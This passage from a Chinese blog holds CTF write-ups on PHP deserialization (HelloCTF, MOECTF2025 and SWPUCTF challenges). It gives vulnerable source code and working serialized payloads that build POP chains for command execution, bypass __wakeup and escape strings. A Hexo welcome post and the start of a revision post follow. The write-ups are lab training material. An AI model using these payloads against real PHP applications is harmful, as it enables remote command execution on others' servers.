<p>获得最终 payload:</p>
<p>O:4:”INIT”:1:{s:4:”name”;O:1:”B”:1:{s:1:”b”;O:1:”A”:1:{s:1:”a”;s:8:”flag.php”;}}}</p>
<p>运行通过!</p>
<p><img src="/images/ZumHb7fuaoBULox6ZSlcEw2Nnmd.png"></p>
<h2 id="反序列化靶场-Level17-字符串逃逸"><a href="#反序列化靶场-Level17-字符串逃逸" class="headerlink" title="[反序列化靶场]Level17-字符串逃逸"></a>[反序列化靶场]Level17-字符串逃逸</h2><p>读题，本题是想告诉我们当序列化字符串中没有对应类的一些成员属性的时候，在反序列化时，解释器会直接从当前类中 COPY 序列化中不存在的成员属性。</p>
<p><img src="/images/ASXjb0SJmociZxxQlBwcYf3nn6g.png"></p>
<p>直接 payload:</p>
<p>o&#x3D;O:1:”A”:1:{s:11:”helloctfcmd”;s:8:”get_flag”;}</p>
<p>即得</p>
<p><img src="/images/Xg5abFXEjoyXVoxt8SDco4qZnRd.png"></p>
<h2 id="反序列化靶场-Level18-字符串逃逸-2"><a href="#反序列化靶场-Level18-字符串逃逸-2" class="headerlink" title="[反序列化靶场]Level18-字符串逃逸 2"></a>[反序列化靶场]Level18-字符串逃逸 2</h2><p>先读本题提示:序列化和反序列化的规则特性,字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 “;}” 作为字符串的结尾判定。</p>
<p><img src="/images/NWvjbAHfHo0k44x0tGYcK7YZnTe.png"></p>
<p>可以看到本题要求我们做一些替换工作让 <code>key</code> 值为 <code>GET_FLAG</code> ，而在前面的对象创建过程中，我们知道 key 值为 <code>GET_FLAG&quot;;}FAKE_FLAG</code>，根据我们所知的特性，将 key 值对应的字符数量缩窄只留下 <code>GET_FLAG</code>，也就是 8 个字符 —— 将 20 替换为 8 即可，接着 题目要求一个新的 FLAG 类，所以还需要将类名标识由 Demo 改为 FLAG。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target</span> = [<span class="string">&#x27;Demo&#x27;</span>,<span class="number">20</span>]</span><br><span class="line"><span class="variable">$change</span> = [<span class="string">&#x27;FLAG&#x27;</span>,<span class="number">8</span>]</span><br></pre></td></tr></table></figure>

<p>使用数组进行正确 payload:</p>
<p>target[]&#x3D;Demo&amp;target[]&#x3D;20&amp;change[]&#x3D;FLAG&amp;change[]&#x3D;8</p>
<p>即得</p>
<p><img src="/images/KujibsGt2ocLiTx8xNBcFUXRnfc.png"></p>
<p>注:回显 bool(false),是因为大括号内属性和大括号外声明的成员属性数量或字符串长度不一致,需要检查成员属性个数或字符串长度.</p>
<h2 id="SQCTF-逃-1"><a href="#SQCTF-逃-1" class="headerlink" title="[SQCTF]逃"></a>[SQCTF]逃</h2><p>见<a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/IaWEwOlPLiMnYYkdvxCcVDhJndb#share-XlHBdFcp0otfERxBVeecurHgn7d">[Week7.3]反序列化漏洞利用</a></p>
<h2 id="MOECTF2025-第十七章-星骸迷阵·神念重构"><a href="#MOECTF2025-第十七章-星骸迷阵·神念重构" class="headerlink" title="[MOECTF2025]第十七章 星骸迷阵·神念重构"></a>[MOECTF2025]第十七章 星骸迷阵·神念重构</h2><p>读题,这里应该是用序列化创建一个类 A 的实例，并将成员变量 a 赋值为需要执行的命令</p>
<p><img src="/images/QBAzbVCV4oZrcUxvTy0cxN8XnOb.png"></p>
<p>以 ls 为命令，写一个序列化的脚本,点击运行获得 payload</p>
<p><img src="/images/AaMTbwZofo4KICxNSMxcR2rWnkc.png"></p>
<p>命令就被成功执行了</p>
<p><img src="/images/HjMNb054towTR6xKXB0cTdPunPb.png"></p>
<p>改成 cat &#x2F;flag,检查字符个数 flag 就被打印了</p>
<p><img src="/images/GhprbGYRJoe3a2x1GSKce6TMnqd.png"></p>
<h2 id="MOECTF2025-第十八章"><a href="#MOECTF2025-第十八章" class="headerlink" title="[MOECTF2025]第十八章"></a>[MOECTF2025]第十八章</h2><p>读题，必然是考 POP 链构造，只有两个类很简单</p>
<p><img src="/images/EelMbnocWoiN1wxjEMqcJjenn2f.png"></p>
<p>写脚本，发现没法在外部修改 name 值，我们先把 name 改成公有，最后才调配格式</p>
<p><img src="/images/TyIRbe0BaogdrAxnhV3cEIEonPd.png"></p>
<p><img src="/images/VCHXbKuCqoixF8xeSJfcnDOEne8.png"></p>
<p>private 改成了 public，输出是这样，a 的 name 属性指向 b，b 的 work 函数在 A 序列化时执行</p>
<p><img src="/images/IfjzbJzSAo62haxAQaJcvPpanvg.png"></p>
<p>改成私有，payload:</p>
<p>O:7:”PersonA”:1:{s:13:”%00PersonA%00name”;O:7:”PersonB”:1:{s:4:”name”;s:18:”echo system(‘ls’);”;}}</p>
<p><img src="/images/EKzlbTdqUoqglJxFPV6cYD04nge.png"></p>
<p>看看根目录 s:18 改成 20 ls &#x2F;果然有 flag</p>
<p><img src="/images/Q0I3blbfsooQKLxSRwuckW6vnNe.png"></p>
<p>命令 cat &#x2F;flag 即得本关旗帜</p>
<p><img src="/images/Eb4Gb1H5GoxGD4x3V3Fc6Gkcntb.png"></p>
<h2 id="MOECTF2025-第十九章"><a href="#MOECTF2025-第十九章" class="headerlink" title="[MOECTF2025]第十九章"></a>[MOECTF2025]第十九章</h2><p>读题，还是个比较难的 POP 链，其中带了个轻过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id; </span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>; </span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id; </span><br><span class="line">        <span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age; </span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable">$age</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__Check</span>(<span class="params"><span class="variable">$age</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">str_contains</span>(<span class="variable">$this</span>-&gt;age . <span class="variable">$this</span>-&gt;name,<span class="string">&quot;flag&quot;</span>)) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$age</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age; </span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id; </span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable">$age</span>; </span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$person</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到突破口$name($age); 顺思路构造 payload,即得答案</p>
<p>O:7:”PersonC”:3:{s:4:”name”;s:6:”system”;s:2:”id”;O:7:”PersonB”:3:{s:4:”name”;s:9:”cat &#x2F;????”;s:2:”id”;O:7:”PersonA”:3:{s:4:”name”;r:1;s:2:”id”;s:7:”__Check”;s:3:”age”;N;}s:3:”age”;N;}s:3:”age”;N;}</p>
<p>注意，$ 变量名 +()不一定是为了执行 invoke，也有变量名是命令执行函数名的情况，直接执行命令执行函数</p>
<p>反序列化很重要，我们再加练几道题熟悉一下魔术方法和 POP 链…</p>
<h2 id="SWPUCTF-2022-新生赛-ez-ez-unserialize"><a href="#SWPUCTF-2022-新生赛-ez-ez-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_unserialize"></a>[SWPUCTF 2022 新生赛]ez_ez_unserialize</h2><p>做题前我们需要知道__FILE__永远指向<strong>当前正在执行的这个 PHP 文件的完整绝对路径</strong>（包含目录 + 文件名）</p>
<p>所以本题我们既需要为 x 赋给好了的 php 文件，又要绕过 wakeup 函数把他赋值回无用的__FILE__</p>
<p>因此我们在序列化的时候将元素个数改为大于 1 的数</p>
<p><img src="/images/Yasvb8CYIoS7W9xBDqacXblxnle.png"></p>
<p>将原本成员个数的 1 改成 2，即得 flag</p>
<p><img src="/images/HpRvbx2fqoW2cgxVH6pc0LJEnxb.png"></p>
<h2 id="SWPUCTF-2021-新生赛-ez-unserialize"><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize</h2><p>待做 需要用到未来知识</p>
<h2 id="SWPUCTF-2021-新生赛-no-wakeup"><a href="#SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup"></a>[SWPUCTF 2021 新生赛]no_wakeup</h2><p>读题，还是绕过 wakeup</p>
<p><img src="/images/LkpDbRsIOobx0Bx6Zc3cZ45Yn3n.png"></p>
<p>同样的道理</p>
<p><img src="/images/VCjtbha0ZoTI8QxAfVgcMsDPnDe.png"></p>
<h2 id="SWPUCTF-2022-新生赛-1z-unserialize"><a href="#SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]1z_unserialize"></a>[SWPUCTF 2022 新生赛]1z_unserialize</h2><p>读题,发现有形如$a($b)的情况，这里可将$a视为命令执行函数，$b 视为函数参数执行命令执行函数</p>
<p><img src="/images/P4MvbQcF7o0ecSxG6eacKQ1lnFf.png"></p>
<p>编写脚本获得 payload，即可进行命令执行</p>
<p><img src="/images/XvkqbCwnPoZ2voxOKbBcvAGynmd.png"></p>
<p><img src="/images/NTvtbevuno3dxFxa3ivcwAOonIP.png"></p>
<p>注意了后面试了一下，ls 命令不可以用单引号覆盖，有些命令加了单引号就不能执行了</p>
<p><img src="/images/PNwVbigfYo2SzLxwIhfcFEdUnFh.png"></p>
<p><img src="/images/AWWnbPLcbopJiixTovYcwYUxnpb.png"></p>
<h2 id="SWPUCTF-2023-秋季新生赛-UnS3rialize"><a href="#SWPUCTF-2023-秋季新生赛-UnS3rialize" class="headerlink" title="[SWPUCTF 2023 秋季新生赛]UnS3rialize"></a>[SWPUCTF 2023 秋季新生赛]UnS3rialize</h2><p>又到了喜闻乐见的 POP 链啊,我们观察一下吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NSS</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;W4keup!!!&lt;br/&gt;&quot;</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo Welcome to NSSCTF&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$whoami</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$argv</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what do you want?&quot;</span>; </span><br><span class="line">        <span class="variable">$want</span> = <span class="variable language_">$this</span>-&gt;whoami; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$want</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger&quot;</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;sth-&gt;<span class="keyword">var</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&quot;nss&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span> = <span class="string">&quot;ctf&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$notes</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$passwd</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user === <span class="string">&quot;SWPU&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;NSS&quot;</span>) &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Now you know how to use __construct&lt;br/&gt;&quot;</span>; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;your notes&quot;</span>.<span class="variable language_">$this</span>-&gt;notes; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;N0!&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$ser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>])); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Let&#x27;s do some deserialization :)&quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先找这个题目的突破口在哪里，显然是类 NSS 的 system 函数，成员变量 cmd 应该是你要执行的指令</p>
<p>有</p>
<p>$a&#x3D;new NSS();</p>
<p>$a-&gt;cmd&#x3D;”ls”;</p>
<p>要触发 system，要执行 invoke</p>
<p>要执行 invoke，必然要修改 class C 中的 $want</p>
<p>$b&#x3D;new C();</p>
<p>$b-&gt;whoami&#x3D;$a;</p>
<p>执行 invoke 的前提条件是类 C 的 get 被执行</p>
<p>我们复习一下:</p>
<p>读取不可访问（protected 或 private）或不存在的属性的值时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> 会被调用。</p>
<p>还剩下 T F 两个类选一个来读取类 C 中不存在的值，我们发现 T 有个变量 <code>var</code> 谁也没有</p>
<p>于是有</p>
<p>$c&#x3D;new T();</p>
<p>$c-&gt;sth&#x3D;$b;&#x2F;&#x2F;用于访问 $b 即类 C 的不存在变量</p>
<p>最后就是用类 F 执行 T 的 tostring 了，这个很简单</p>
<p>$d&#x3D;new F();</p>
<p>$d-&gt;user&#x3D;”SWPU”;</p>
<p>$d-&gt;passwd&#x3D;”NSS”;</p>
<p>$d-&gt;note&#x3D;$c;&#x2F;&#x2F;用于打印 c</p>
<p>我们把这几行代码全输到脚本里</p>
<p><img src="/images/LDoybzVHXobPTXxsfTDcIbSMnAf.png"></p>
<p>得到 payload:</p>
<p>O:1:”F”:3:{s:4:”user”;s:4:”SWPU”;s:6:”passwd”;s:3:”NSS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:6:”whoami”;O:3:”NSS”:1:{s:3:”cmd”;s:2:”ls”;}}}}</p>
<p>进行 base64 编码,使用 get 提交即可.</p>
<p>卧槽?还得绕过 wakeup,改一个数字</p>
<p>O:1:”F”:4:{s:4:”user”;s:4:”SWPU”;s:6:”passwd”;s:3:”NSS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:6:”whoami”;O:3:”NSS”:1:{s:3:”cmd”;s:2:”ls”;}}}}</p>
<p>运行通过!</p>
<p><img src="/images/F6Ccb6aeGoQLdHxRbcFcjkTunDb.png"></p>
<p>查 ls &#x2F; 根目录下 flag</p>
<p><img src="/images/SR6LbHXkVo5MQMxOZMhcvN4Xndc.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/01/18/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/01/18/hello-world/" class="post-title-link" itemprop="url">欢迎大家前来阅读文章</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2026-01-18 20:29:17" itemprop="dateCreated datePublished" datetime="2026-01-18T20:29:17+08:00">2026-01-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-19 01:53:53" itemprop="dateModified" datetime="2026-01-19T01:53:53+08:00">2026-01-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/01/16/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-%E6%80%9D%E6%83%B3%E9%81%93%E5%BE%B7%E4%B8%8E%E6%B3%95%E6%B2%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/01/16/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-%E6%80%9D%E6%83%B3%E9%81%93%E5%BE%B7%E4%B8%8E%E6%B3%95%E6%B2%BB/" class="post-title-link" itemprop="url">期末突击-思想道德与法治</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2026-01-16 10:20:00" itemprop="dateCreated datePublished" datetime="2026-01-16T10:20:00+08:00">2026-01-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:04:38" itemprop="dateModified" datetime="2026-01-21T01:04:38+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/schedule/" itemprop="url" rel="index"><span itemprop="name">-schedule</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h1><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="新时代的内涵"><a href="#新时代的内涵" class="headerlink" title="新时代的内涵"></a>新时代的内涵</h3><p>是在新的历史条件下继续夺取中国特色社会主义伟大胜利的时代</p>
